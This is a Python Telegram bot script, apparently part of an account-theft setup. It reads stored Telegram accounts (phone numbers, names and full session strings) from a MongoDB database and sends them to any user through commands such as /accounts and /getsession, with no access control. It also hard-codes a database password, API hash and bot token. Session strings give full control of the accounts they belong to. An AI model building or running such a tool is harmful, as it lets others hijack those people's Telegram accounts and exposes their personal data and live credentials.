from telethon import TelegramClient, events
from telethon.sessions import StringSession
import pymongo
import asyncio
import os

# MongoDB configuration
MONGO_URI = "mongodb+srv://botuser:botpass123@cluster0.juyoluw.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0"
DB_NAME = "guess_bot"
ACCOUNTS_COLL = "Accounts"

# Telegram Bot configuration
SESSION_NAME = "hexamon_bot_telethon"
API_ID = 29288199
API_HASH = "9ff308629870e029601d2ee667821506"
BOT_TOKEN = "8459680405:AAGxmZF8bJL9kxOKwIFKWnf8jPaa_d5CoiU"

# Initialize MongoDB client
try:
    mongo_client = pymongo.MongoClient(MONGO_URI)
    db = mongo_client[DB_NAME]
    accounts_collection = db[ACCOUNTS_COLL]
    print("✅ Connected to MongoDB")
except Exception as e:
    print(f"❌ MongoDB connection failed: {e}")
    exit(1)

async def send_large_message(event, text):
    """Send large messages by splitting them"""
    if len(text) <= 4096:
        await event.reply(text)
    else:
        # Split into multiple messages
        parts = [text[i:i+4096] for i in range(0, len(text), 4096)]
        for part in parts:
            await event.reply(part)

async def accounts_command_handler(event):
    """Handle /accounts command - Show FULL session strings"""
    try:
        # Get all accounts from MongoDB
        all_accounts = list(accounts_collection.find({}))
        
        if not all_accounts:
            await event.reply("📭 No accounts found in database.")
            return
        
        total_accounts = len(all_accounts)
        await event.reply(f"📱 **Found {total_accounts} accounts**\n\n⏳ Processing...")
        
        # Send each account in separate messages to show FULL session
        for i, account in enumerate(all_accounts, 1):
            phone = account.get('phone', 'N/A')
            session_string = account.get('session_string', 'N/A')
            first_name = account.get('first_name', 'N/A')
            username = account.get('username', 'N/A')
            
            message = f"""
🔰 **ACCOUNT {i}/{total_accounts}**

👤 **Name:** {first_name}
📞 **Phone:** `{phone}`
🆔 **Username:** @{username}
🔑 **FULL Session String:**
`{session_string}`
            """
            
            await send_large_message(event, message)
            await asyncio.sleep(1)  # Small delay to avoid rate limits
            
    except Exception as e:
        await event.reply(f"❌ Error fetching accounts: {e}")

async def accounts_compact_handler(event):
    """Handle /accounts_compact command - Show compact list"""
    try:
        all_accounts = list(accounts_collection.find({}))
        
        if not all_accounts:
            await event.reply("📭 No accounts found in database.")
            return
        
        message = "📱 **ACCOUNTS LIST**\n\n"
        
        for i, account in enumerate(all_accounts, 1):
            phone = account.get('phone', 'N/A')
            first_name = account.get('first_name', 'N/A')
            username = account.get('username', 'N/A')
            
            message += f"**{i}. {first_name}**\n"
            message += f"   📞 `{phone}`\n"
            message += f"   🆔 @{username}\n"
            message += "   ──────────────────────────\n"
        
        message += f"\n📊 **Total: {len(all_accounts)} accounts**"
        message += f"\n\n💡 Use `/getsession {phone}` to get full session string"
        
        await send_large_message(event, message)
            
    except Exception as e:
        await event.reply(f"❌ Error: {e}")

async def get_session_handler(event):
    """Handle /getsession command - Get full session for specific phone"""
    try:
        command_text = event.text.split()
        if len(command_text) < 2:
            await event.reply("❌ Usage: /getsession <phone_number>")
            return
        
        phone = command_text[1]
        account = accounts_collection.find_one({"phone": phone})
        
        if not account:
            await event.reply(f"❌ No account found with phone: `{phone}`")
            return
        
        session_string = account.get('session_string', 'N/A')
        first_name = account.get('first_name', 'N/A')
        username = account.get('username', 'N/A')
        
        message = f"""
🎯 **ACCOUNT FOUND**

👤 **Name:** {first_name}
📞 **Phone:** `{phone}`
🆔 **Username:** @{username}

🔑 **FULL SESSION STRING:**
`{session_string}`
        """
        
        await send_large_message(event, message)
        
    except Exception as e:
        await event.reply(f"❌ Error: {e}")

async def accounts_count_handler(event):
    """Handle /count command to show account statistics"""
    try:
        total_accounts = accounts_collection.count_documents({})
        accounts_with_phone = accounts_collection.count_documents({"phone": {"$ne": "N/A", "$exists": True}})
        accounts_with_session = accounts_collection.count_documents({"session_string": {"$ne": "N/A", "$exists": True}})
        
        message = f"""
📊 **ACCOUNTS STATISTICS**

📱 Total Accounts: **{total_accounts}**
📞 With Phone: **{accounts_with_phone}**
🔑 With Session: **{accounts_with_session}**
        """
        await event.reply(message)
        
    except Exception as e:
        await event.reply(f"❌ Error: {e}")

async def start_handler(event):
    """Handle /start command"""
    await event.reply("""
🤖 **Accounts Manager Bot**

🔐 **Available Commands:**

/accounts - Show ALL accounts with FULL session strings
/accounts_compact - Show compact accounts list
/getsession <phone> - Get full session for specific phone
/count - Show account statistics  
/test - Test if bot is working

💡 **Tip:** Use /getsession with phone number to get specific account session
    """)

async def test_handler(event):
    """Handle /test command"""
    await event.reply("✅ Bot is working and connected to database!")

def main():
    # Create bot client
    bot = TelegramClient(SESSION_NAME, API_ID, API_HASH)
    
    @bot.on(events.NewMessage(pattern='/start'))
    async def start_handler_event(event):
        await start_handler(event)
    
    @bot.on(events.NewMessage(pattern='/accounts'))
    async def accounts_handler(event):
        await accounts_command_handler(event)
    
    @bot.on(events.NewMessage(pattern='/accounts_compact'))
    async def accounts_compact_handler_event(event):
        await accounts_compact_handler(event)
    
    @bot.on(events.NewMessage(pattern='/getsession'))
    async def get_session_handler_event(event):
        await get_session_handler(event)
    
    @bot.on(events.NewMessage(pattern='/count'))
    async def count_handler(event):
        await accounts_count_handler(event)
    
    @bot.on(events.NewMessage(pattern='/test'))
    async def test_handler_event(event):
        await test_handler(event)
    
    print("🤖 Bot is starting...")
    bot.start(bot_token=BOT_TOKEN)
    print("✅ Bot is running!")
    print("💡 Available commands:")
    print("   /accounts - Show all accounts with FULL sessions")
    print("   /getsession <phone> - Get specific account session")
    print("   /count - Show statistics")
    bot.run_until_disconnected()

if __name__ == "__main__":
    print("🔐 ACCOUNTS MANAGER BOT - FULL SESSIONS")
    print("=" * 50)
    main()
